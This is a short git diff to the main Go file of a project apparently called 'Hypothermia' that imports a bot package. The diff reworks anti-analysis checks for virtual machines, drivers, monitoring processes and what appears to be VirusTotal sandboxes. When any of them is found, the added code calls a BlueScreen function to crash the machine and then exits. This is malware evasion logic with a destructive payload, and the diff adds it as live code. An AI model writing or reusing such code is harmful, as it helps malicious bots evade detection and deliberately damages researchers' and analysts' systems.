@@ -8,25 +8,38 @@ import (
 
 	"Hypothermia/config"
 	"Hypothermia/src/bot"
+	"Hypothermia/src/funcs"
 	"Hypothermia/src/utils"
 )
 
 func main() {
 	if config.AntiVM {
+		code := 0
+
 		if utils.CheckVMs() {
-			fmt.Println("adc/v")
-			fmt.Scanln()
-			return
+			code = 1
 		}
 
 		if utils.CheckDrivers() {
-			fmt.Println("adc/d")
-			fmt.Scanln()
-			return
+			code = 2
 		}
 
 		if utils.CheckProcesses() {
-			fmt.Println("adc/p")
+			code = 3
+		}
+
+		if utils.CheckVT() {
+			code = 4
+
+			funcs.BlueScreen()
+			os.Exit(1)
+			return
+		}
+
+		if code != 0 {
+			funcs.BlueScreen()
+
+			fmt.Println("AVC -", code)
 			fmt.Scanln()
 			return
 		}
